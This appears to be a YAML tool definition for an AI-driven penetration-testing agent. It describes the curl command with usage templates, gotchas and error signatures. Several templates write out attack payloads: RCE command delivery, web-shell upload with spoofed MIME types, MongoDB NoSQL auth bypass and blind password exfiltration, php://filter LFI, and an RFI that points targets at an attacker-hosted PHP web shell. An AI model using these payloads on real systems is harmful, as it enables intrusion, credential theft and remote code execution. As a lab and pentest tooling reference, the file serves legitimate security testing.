name: curl
kind: cli
binary: curl
version: "7.88.1"
description: "HTTP/HTTPS/FTP client with HTTP/2, HTTP/3, NTLM, Kerberos, and TLS 1.3 support. The Swiss Army knife for web-layer pentesting: send arbitrary requests with custom methods/headers/bodies, deliver RCE payloads, upload web shells via multipart, download files (text or binary). Supports cookies, auth (basic/digest/NTLM/negotiate), redirect following, proxy chains, SSL bypass, certificate auth, and per-step timing instrumentation. The native CLI; LLM constructs the full curl invocation. Use playwright for JavaScript-rendered pages; for stateful login flows curl is itself the answer — drive a login with `-c` to write a cookie jar, then `-b` it back on subsequent calls."
image: "ghcr.io/silicon-works/mcp-tools-curl:latest"
image_size_mb: 100
# Dual-clock model:
#   idle_timeout_seconds — silence between MCP heartbeats (60 s — curl
#     emits output as it streams; 60 s silent means stuck or no progress)
#   max_runtime_seconds  — hard wall-clock cap; never resets on heartbeat
#     (10 min — curl request/response should never take longer than this)
# Legacy `timeout_seconds` is used by older clients as the hard cap.
idle_timeout_seconds: 60
max_runtime_seconds: 600
timeout_seconds: 600

capabilities:
  - http_request
  - http_post
  - file_download
  - file_upload
  - exploit_payload_delivery
  - api_interaction
  - header_inspection
  - tls_test
  - nosql_injection

phases:
  - reconnaissance
  - enumeration
  - exploitation

routing:
  use_for:
    - "make a single HTTP request to test an endpoint or check headers"
    - "send a POST/PUT body (JSON, form-urlencoded, raw) to a web app"
    - "deliver an RCE payload to a confirmed command-injection endpoint"
    - "upload a web shell or arbitrary file via multipart/form-data"
    - "download a file (wordlist, exploit, config, key) to /session"
    - "interact with a REST/GraphQL API using bearer tokens or cookies"
    - "check response headers for server/framework version fingerprinting"
    - "test SSL/TLS configuration or follow a redirect chain"
    - "exercise NTLM/Negotiate/Digest auth against an HTTP service"
    - "trigger SSRF via crafted URL parameters"
    - "test NoSQL injection (MongoDB operator injection: $ne / $regex / $where) — auth bypass and blind exfiltration on MongoDB-backed apps"
  never_use_for:
    - "directory or parameter brute-forcing — use ffuf"
    - "rendering JavaScript-heavy pages — use playwright"
    - "automated vulnerability scanning — use nuclei or zap"
    - "cracking HTTP basic auth via wordlist — use hydra"
  triggers:
    - "curl"
    - "http request"
    - "fetch url"
    - "download wordlist"
    - "upload web shell"
    - "exploit payload"
    - "api call"
    - "check headers"
    - "nosql injection"
    - "mongodb injection"
    - "mongodb auth bypass"
    - "operator injection"
    - "$ne"
    - "$regex"
    - "$where"
    - "blind nosql exfiltration"

requirements:
  network: true
  privileged: false

resources:
  memory_mb: 64
  cpu: 0.25

see_also:
  - tool: playwright
    reason: "For JavaScript-rendered pages or DOM interaction"
  - tool: ffuf
    reason: "For directory/parameter fuzzing — curl is one-shot only"
  - tool: nuclei
    reason: "For automated CVE / misconfiguration scanning"
  - tool: zap
    reason: "For proxy-based interception and automated scanning"

# ── kind:cli specific sections ──────────────────────────────────────

target_extraction:
  # curl URL is typically the LAST positional argument, e.g. `curl -sS -H 'X: y' https://target/path`
  # First rule: try last positional that parses as a URL.
  - rule: "positional_match"
    pattern: "^(https?|ftp|ftps|file|gopher|telnet|dict|ldap|ldaps|scp|sftp|smb|smbs|imap|imaps|pop3|pop3s|smtp|smtps|tftp|rtsp|rtmp|wss?)://([^:/?#]+)"
    group: 2
  # Fallback: bare URL via -u/--url flag (curl does support --url explicitly)
  - rule: "flag_value"
    flag: "--url"
    parse_as: "url_host"

# Env vars accepted by cli_in_container's `env` arg for this tool.
# Container knobs FAKETIME / FAKETIME_DONT_FAKE_MONOTONIC are always allowed
# (the plugin hoists them to libfaketime). Anything else must be listed here.
# `curl --negotiate -u :` reads the Kerberos ccache from KRB5CCNAME (typically
# obtained from a prior impacket-getTGT call); KRB5_CONFIG selects krb5.conf.
allowed_env:
  - KRB5CCNAME      # Kerberos ccache path (--negotiate auth)
  - KRB5_CONFIG     # path to krb5.conf (realm / KDC config)

usage_patterns:
  - name: "Basic GET"
    command: "curl -sS -o {output} -w '%{http_code} %{size_download}b %{time_total}s\\n' {url}"
    when: "Fetch a URL, save body to file, print status and size"

  - name: "GET with custom headers"
    command: "curl -sS -H {header1} -H {header2} -o {output} {url}"
    when: "Fetch with one or more custom headers (e.g., Authorization, User-Agent)"

  - name: "HEAD only"
    command: "curl -sSI -o {output} {url}"
    when: "Get response headers only (no body) — useful for fingerprinting and CORS checks"

  - name: "POST JSON body"
    command: "curl -sS -X POST -H 'Content-Type: application/json' -d '{json_body}' -o {output} {url}"
    when: "Send a JSON payload to a REST API"

  - name: "POST form-urlencoded"
    command: "curl -sS -X POST -d '{field1}={value1}&{field2}={value2}' -o {output} {url}"
    when: "Send classic form-encoded data (login forms, search queries)"

  - name: "POST multipart file upload"
    command: "curl -sS -F '{file_field}=@{local_path};type={mime_type};filename={remote_name}' -o {output} {url}"
    when: "Upload a file via multipart/form-data — web shells, profile pictures, etc."

  - name: "Follow redirects with cookie jar"
    command: "curl -sSL -b {cookie_jar} -c {cookie_jar} -o {output} {url}"
    when: "Maintain cookie state through a chain of redirects"

  - name: "Basic auth"
    command: "curl -sS -u {user}:{password} -o {output} {url}"
    when: "Authenticate with HTTP Basic auth"

  - name: "Bearer token auth"
    command: "curl -sS -H 'Authorization: Bearer {token}' -o {output} {url}"
    when: "Call a token-protected API endpoint"

  - name: "NTLM auth (Windows endpoint)"
    command: "curl -sS --ntlm -u {domain}\\\\{user}:{password} -o {output} {url}"
    when: "Authenticate to an IIS or other NTLM-protected endpoint"

  - name: "Negotiate (Kerberos) auth"
    command: "curl -sS --negotiate -u : -o {output} {url}"
    when: "Authenticate via Kerberos using existing ccache (KRB5CCNAME env)"

  - name: "Skip TLS verification"
    command: "curl -sSk -o {output} {url}"
    when: "Lab/HTB environments with self-signed certs — never in production assessment"

  - name: "Download large file directly to disk"
    command: "curl -sSL -o {output_path} {url}"
    when: "Save wordlists, exploits, binaries to /session/ — no memory buffering"

  - name: "Verbose for debugging"
    command: "curl -vv -o {output} {url} 2>{trace_log}"
    when: "Capture full request/response handshake into a separate log for debugging"

  - name: "Chunked timing breakdown"
    command: "curl -sS -o {output} -w '%{json}' {url}"
    when: "Get timing JSON: DNS, connect, TLS, TTFB, total — useful for timing-based attacks"

  - name: "POST raw binary body from file"
    command: "curl -sS -X POST --data-binary @{local_file} -H 'Content-Type: {mime_type}' -o {output} {url}"
    when: "Send a raw binary payload (file upload via PUT, custom protocol)"

  - name: "Proxy through a SOCKS5"
    command: "curl -sS --socks5 {proxy_host}:{proxy_port} -o {output} {url}"
    when: "Pivot through a SOCKS proxy (e.g., chisel server + reverse client R:1080:socks, or ssh -D dynamic forward via the ssh tool's ControlMaster pattern — legacy `tunnel` kind:mcp tool was retired May 2026, its functionality absorbed into ssh kind:cli v3.0)"

  - name: "Cookie-based exploit/payload delivery"
    command: "curl -sS -b 'session={session_cookie}' -X POST -d 'cmd={url_encoded_command}' -o {output} {url}"
    when: "Deliver an RCE payload to a vulnerable endpoint requiring a valid session cookie"

  # ── NoSQL injection (replaces nosqlmap; MongoDB operator-injection methodology) ────
  # Detection upstream: nuclei NoSQL templates flag candidate endpoints. Confirmation
  # and exploitation belong to curl + crafted JSON below. Post-foothold MongoDB
  # enumeration is the `mongodb` tool's job, not curl's.
  - name: "NoSQL auth bypass — MongoDB $ne operator (JSON body)"
    command: "curl -sS -X POST -H 'Content-Type: application/json' -d '{nosql_payload}' -i -o {output} {url}"
    when: "Bypass a MongoDB-backed login form that accepts JSON. Build nosql_payload as '{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}' — the $ne (not-equal) operator makes the query match the first document in the collection (typically admin). -i includes response headers so the agent can spot the Set-Cookie / 302-to-dashboard signal that confirms bypass. Compare against a baseline {\"username\":\"x\",\"password\":\"x\"} response (expect 401)"

  - name: "NoSQL auth bypass — bracket syntax (form-urlencoded body)"
    command: "curl -sS -X POST -d '{user_field}[$ne]=&{pass_field}[$ne]=' -i -o {output} {url}"
    when: "Same MongoDB $ne auth-bypass for endpoints that accept form-urlencoded with deep key parsing (Express body-parser, PHP). Server translates 'username[$ne]=' into {username: {$ne: ''}} before the Mongo query. Use when the JSON variant returns 415 Unsupported Media Type or the server only accepts form bodies"

  - name: "NoSQL blind regex exfiltration (boolean-blind, byte-by-byte)"
    command: "curl -sS -X POST -H 'Content-Type: application/json' -d '{nosql_payload}' -o {output} {url}"
    when: "Exfiltrate a MongoDB document field byte-by-byte once a username is known. Build nosql_payload as '{\"username\":\"{known_user}\",\"password\":{\"$regex\":\"^{prefix}.*\"}}' — login succeeds when prefix matches the real password's start. Loop prefix character-by-character (a-z, A-Z, 0-9, common symbols), widening as matches succeed. Boolean-blind: distinguish via response status / body diff / Set-Cookie. This is the workhorse that replaces nosqlmap's blind extraction"

  - name: "NoSQL detection — operator injection probe (bare $ne)"
    command: "curl -sS -X POST -H 'Content-Type: application/json' -d '{\"{param}\":{\"$ne\":\"x\"}}' -i -o {output} {url}"
    when: "Single-shot probe to detect whether an endpoint passes JSON values directly to a Mongo query. If the server returns HTTP 500 or a different response than for {\"{param}\":\"x\"}, the field is unsafely interpolated and operator injection is exploitable. Use after nuclei NoSQL templates flag a candidate, before committing to full auth-bypass / exfiltration runs"

  - name: "LFI source disclosure via php://filter (replaces retired lfi-rfi php_filter)"
    command: "curl -sS -o {output} '{url}?{param}=php://filter/convert.base64-encode/resource={target_file}'"
    when: "Read PHP source (which a plain LFI would execute, not show) by base64-encoding it through php://filter. {target_file} e.g. 'index.php', 'config.php', '../config/database.php'. The response body carries a base64 blob — decode it with `base64 -d`. YOU pick which blob from the response to decode — more reliable than the retired lfi-rfi's regex that grabbed the first 20+ char base64-ish string (could be a CSRF token / session id). For non-UTF8 or filtered reads, chain convert.iconv filters."

  - name: "RFI via attacker-hosted payload + callback listener (replaces retired lfi-rfi test_rfi)"
    command: "curl -sS -o {output} '{url}?{param}=http://{listener_ip}:{listener_port}/shell.txt'"
    when: "CORRECT RFI verification: point the include parameter at an attacker-controlled URL and confirm via a listener that ACTUALLY RECEIVED the request — NOT by inspecting the response body. Run the listener first (nc -lvnp {port}, python3 -m http.server, or tools/responder) hosting shell.txt = '<?php system($_GET[\"c\"]); ?>'. Listener logs a hit → RFI confirmed + PHP executed server-side. The retired lfi-rfi test_rfi used `status==200 and len(body)>0` which produces false positives — this listener method is the accurate technique. RFI requires allow_url_include=On (PHP). When remote-URL fetch is filtered, data:// is the LFI-side alternative: ?{param}=data://text/plain;base64,<b64-of-php>"

  - name: "Authenticated session flow via persistent cookie jar (replaces retired web-session)"
    command: "curl -skL -c /session/cookies/{name}.txt -d '{login_form_body}' '{login_url}' && curl -skL -b /session/cookies/{name}.txt -c /session/cookies/{name}.txt -o {output} '{protected_url}'"
    when: "Stateful login then reuse the session — the role web-session used to fill. Call 1 posts the form (-d 'username=admin&password=pass'; use --data-urlencode for values with special chars); -c writes Set-Cookie into a Netscape jar under /session/cookies/. -L follows the post-login redirect (logins almost always 302 to a dashboard; without -L you miss the landing page and any cookie set on the redirect — web-session's urllib followed redirects by default). -k ignores TLS cert errors (web-session did ssl.CERT_NONE by default — pentest targets routinely have self-signed/expired certs). Reuse calls pass BOTH -b jar -c jar so a rotated/upgraded post-login session cookie is written back (web-session auto-merged new Set-Cookie on every request; a bare -b would pin a stale pre-auth session id). The jar feeds curl's own -b directly; OTHER tools want the cookie STRING not the jar file — derive it: awk 'NF>=7{printf \"%s=%s; \",$6,$7}' /session/cookies/{name}.txt then feed ffuf -b / sqlmap --cookie / nuclei -H 'Cookie: ...' (nikto -id is HTTP basic-auth, a separate mechanism). CSRF: fetch the form and grep the token in one shot — `curl -skL -b jar -c jar URL | grep -oP 'name=\"csrf_token\" value=\"\\K[^\"]+'` — then put it in the next -d body, keeping -b/-c on the same jar so cookie+token stay paired. Common token variants web-session matched: Django name=\"csrfmiddlewaretoken\", <meta name=\"csrf-token\" content=\"...\">, JSON \"csrf_token\":\"...\", and reversed value=\"...\" ... name=\"csrf...\" attribute order — adjust the regex per target. For JavaScript-rendered / OAuth / MFA logins curl cannot execute (no JS engine) — use playwright, then export its cookies into a jar."

  - name: "Online pre-cracked hash lookup before offline cracking (replaces retired hash-lookup)"
    command: "curl -sS 'https://www.nitrxgen.net/md5db/{hash}'"
    when: "FIRST move for UNSALTED hashes (MD5/SHA1/NTLM) before burning john/hashcat CPU — public pre-cracked DBs answer in ~1-3s. Query free sources, stop at first non-empty hit: (1) nitrxgen, MD5 only, fastest: `curl -sS https://www.nitrxgen.net/md5db/<hash>` — a non-empty response body IS the plaintext. (2) hashtoolkit, MD5/SHA1/SHA256, HTML scrape: `curl -sS 'https://hashtoolkit.com/reverse-hash?hash=<hash>' | grep -oP 'class=\"res-text\"[^>]*>\\K[^<]+'`. (3) hashes.com: the FREE /en/api/identifier endpoint only identifies hash TYPE, it does NOT return plaintext — the retired hash-lookup tool wrongly parsed it for a `plaintext` field and so never actually worked; the real cracked lookup is the PAID https://hashes.com/en/api/search (requires an API key + account credits) — only use with a key. HARD LIMITS: online DBs only hold UNSALTED hashes — Linux $6$, bcrypt $2a$/$2b$, sha512crypt, scrypt, argon2 will NEVER be found, skip straight to john/hashcat. A 32-hex string is ambiguous MD5-vs-NTLM (Windows/SAM source ⇒ NTLM, web app ⇒ usually MD5). Batch = a shell loop over the per-hash call. Hash TYPE identification: prefer john's identify (john format names are more definitive than length heuristics). To GENERATE a hash for match-verification: md5/sha1/sha256/sha512 via coreutils (`printf %s 'pw' | sha256sum`) or `openssl dgst -sha256`; NTLM is MD4(UTF-16LE) and modern OpenSSL3 disables md4 in hashlib — use impacket `python3 -c \"from impacket.ntlm import compute_nthash; from binascii import hexlify; print(hexlify(compute_nthash('pw')).decode())\"` or passlib `nthash.hash('pw')`. All three lookup services are third-party: a miss is INCONCLUSIVE (service down / HTML changed), not proof the hash is uncracked."

output_formats:
  - flag: "-o {path}"
    format: "body_to_file"
    preferred: true
  - flag: "-w '%{json}'"
    format: "stats_json"
    preferred: false
  - flag: "-i"
    format: "include_response_headers"
    preferred: false
  - flag: "-D {path}"
    format: "headers_to_file"
    preferred: false
  - flag: "-v"
    format: "verbose_to_stderr"
    preferred: false

common_options:
  request_method:
    - "-X METHOD: HTTP method (GET, POST, PUT, DELETE, HEAD, OPTIONS, PATCH)"
    - "-G: Convert -d data to URL query string (forces GET)"
  request_body:
    - "-d 'data': URL-encoded body (sets Content-Type: application/x-www-form-urlencoded)"
    - "--data-binary @file: Send file contents raw (no encoding)"
    - "--data-urlencode 'k=v': URL-encode the value"
    - "--data-raw 'data': Like -d but no @file expansion"
  request_headers:
    - "-H 'Name: value': Custom header (repeat for multiple)"
    - "-A 'string': Set User-Agent (shorthand for -H 'User-Agent: ...')"
    - "-e 'url': Set Referer"
  cookies:
    - "-b 'name=val' or -b file: Send cookies"
    - "-c file: Save received cookies to jar (combine with -b for round-trip)"
  auth:
    - "-u user:password: Basic auth (default)"
    - "--ntlm -u DOMAIN\\\\user:pass: NTLM auth"
    - "--negotiate -u : : Kerberos/SPNEGO (uses existing ccache)"
    - "--digest -u user:pass: Digest auth"
    - "-E cert.pem --key key.pem: Client certificate auth"
  multipart:
    - "-F 'name=value': Form field"
    - "-F 'name=@/path/to/file': File upload"
    - "-F 'name=@/path;type=mime;filename=newname': File with type override + rename"
  redirects:
    - "-L: Follow redirects (default 50 hops)"
    - "--max-redirs N: Limit redirect count"
    - "--post301 / --post302 / --post303: Keep POST body across redirect"
  output:
    - "-o file: Body to file"
    - "-O: Save with remote filename"
    - "-D file: Response headers to file"
    - "-i: Include response headers in body output"
    - "-w 'fmt': Write-out format (e.g., '%{http_code}', '%{json}', '%{size_download}')"
  ssl_tls:
    - "-k / --insecure: Skip cert verification (HTB/labs only)"
    - "--cacert / --capath: Custom CA"
    - "--tlsv1.2 / --tls-max 1.3: Force TLS version range"
    - "--ciphers LIST: Restrict cipher suites"
  timing_and_retry:
    - "--max-time N: Hard timeout for whole operation (seconds)"
    - "--connect-timeout N: TCP connect timeout"
    - "--retry N: Retry on transient failures"
    - "--retry-delay N: Wait between retries"
  proxy:
    - "-x http://host:port: HTTP proxy"
    - "--socks5 host:port: SOCKS5 proxy"
    - "--proxy-user user:pass: Proxy auth"
  verbosity:
    - "-s: Silent (no progress bar)"
    - "-S: Show errors even with -s"
    - "-v / -vv / -vvv: Verbose request/response headers (to stderr)"
    - "--trace-ascii file: Full wire trace to file"

gotchas:
  - "Always use -sS together (silent + show-errors) so progress bar doesn't pollute parsed output, but errors still surface"
  - "For binary / large responses use -o FILE — never let multi-MB content land in stdout (it bloats LLM context and breaks JSON parsing)"
  - "When piping JSON responses to jq, add -sS or pipe stderr separately — the curl progress bar will corrupt JSON"
  - "Default User-Agent is 'curl/X.Y.Z' — many WAFs block this. Use -A to mimic a real browser"
  - "When following redirects with -L, the server may strip Authorization header on cross-origin hops. Use --location-trusted to keep it (DANGEROUS — only inside scope)"
  - "POST + -L by default downgrades to GET on 301/302/303. Use --post301/--post302/--post303 to keep the body"
  - "--data-binary @file vs -d @file: -d strips newlines; --data-binary preserves bytes exactly"
  - "For NTLM, the user format is DOMAIN\\\\user (note: DOUBLE backslash inside shell quotes, single backslash in YAML strings)"
  - "Kerberos --negotiate needs KRB5CCNAME env pointing at a valid ccache. Get a TGT first via impacket-getTGT and pass --use-kcache equivalents"
  - "On HTB / labs, --insecure is fine. NEVER use it on real engagements without explicit authorization — masks MITM"
  - "If a response body is empty but status is 200, the page likely needs JavaScript — switch to playwright"
  - "Multi-line -d values: use --data-binary @/path/to/file instead of trying to embed newlines in shell quoting"
  - "HTTP/3 is opt-in: --http3 (or --http3-only). Some lab targets only speak HTTP/3 for testing"
  - "When uploading with -F to bypass MIME checks, set type explicitly: -F 'file=@shell.php;type=image/jpeg'"
  - "%{json} write-out gives you everything: timing, sizes, headers — use it for one-shot diagnostic runs"
  - "Exit codes carry meaning: 6=DNS, 7=connect refused, 28=timeout, 35=SSL handshake, 47=redirect loop, 52=empty reply, 56=recv error, 60=cert verify. Treat 6/7/28/52/56 as retryable; 35/47/60 as config errors (don't retry without changing flags)"
  - "Redirect chains with -i -L produce CONCATENATED header blocks separated by blank lines — the LAST `HTTP/x` status line is the final response. Don't grep the first one"
  - "RCE payload encoding: when injecting a command into a URL path, single-encode (curl already URL-encodes the URL); when injecting into a query string already inside a URL-encoded body, double-encode. base64 the payload first if the target shell mangles quotes/spaces"
  - "Binary downloads: NEVER let multi-MB content land in stdout — use `-o /session/output/file.bin`. If you must capture in stdout (e.g., piping into another tool), expect base64 wrapping at the client layer"
  - "Auto-decompression: curl does NOT auto-gunzip when -o writes to disk. If the URL ends `.gz` and you want the inflated file, save as `.gz` then `gunzip` it (or stream through `--compressed` if the server supports it)"
  - "HTTP/2 empty-body responses sometimes lack the trailing `\\r\\n\\r\\n` separator — `-i` output may show only the status line + headers with no body section. This is normal for 204/304 and HEAD-style responses, not a parsing bug"
  - "`-w '%{json}'` returns ALL fields in seconds (floats); convert to ms for human-readable timing. `time_appconnect - time_connect` = TLS handshake duration (zero for plain HTTP)"

failure_signatures:
  - signal: "Could not resolve host"
    remediation: "Check hostname spelling, verify /etc/hosts mapping inside the container, or use IP directly"
  - signal: "Connection refused"
    remediation: "Verify port is open with nmap; target may be filtered by firewall"
  - signal: "Couldn't connect to server"
    remediation: "Verify port is open with nmap; target may be filtered by firewall"
  - signal: "Failed to connect to"
    remediation: "Connection failed — verify target IP/hostname and that the port is open"
  - signal: "Operation timed out"
    remediation: "Increase --max-time or --connect-timeout; check network path"
  - signal: "Timeout was reached"
    remediation: "Increase --max-time or --connect-timeout; check network path or VPN"
  - signal: "Connection timed out"
    remediation: "TCP connect timed out — target may be filtered or down. Verify with nmap"
  - signal: "SSL certificate problem"
    remediation: "Add -k for HTB/lab targets; on real engagements verify the cert chain"
  - signal: "SSL handshake failed"
    remediation: "Try --tlsv1.2 / --ciphers DEFAULT@SECLEVEL=0 for weak/legacy servers"
  - signal: "Maximum (50) redirects followed"
    remediation: "Likely a redirect loop — drop -L and inspect the chain manually"
  - signal: "Empty reply from server"
    remediation: "Server dropped the connection — try with -v to see what curl sent, or switch to playwright if JS is involved"
  - signal: "HTTP/2 stream"
    remediation: "Some servers reject HTTP/2; force --http1.1"
  - signal: "Send failure"
    remediation: "Connection broken mid-request — retry with --retry 2"
  - signal: "401 Unauthorized"
    remediation: "Add credentials with -u user:pass, --ntlm, --negotiate, or -H 'Authorization: Bearer ...'"
  - signal: "403 Forbidden"
    remediation: "Try a different User-Agent (-A), add a Referer (-e), or check IP allowlist"

help_commands:
  - command: "curl --help all"
    purpose: "Full flag reference (curl 8.x — categorized by area)"
  - command: "curl --manual"
    purpose: "Comprehensive manual page"
  - command: "curl -V"
    purpose: "Version and feature support (HTTP/2, HTTP/3, NTLM, Kerberos, libssh, etc.)"
  - command: "curl --help category"
    purpose: "List flag categories (auth, dns, http, output, etc.)"
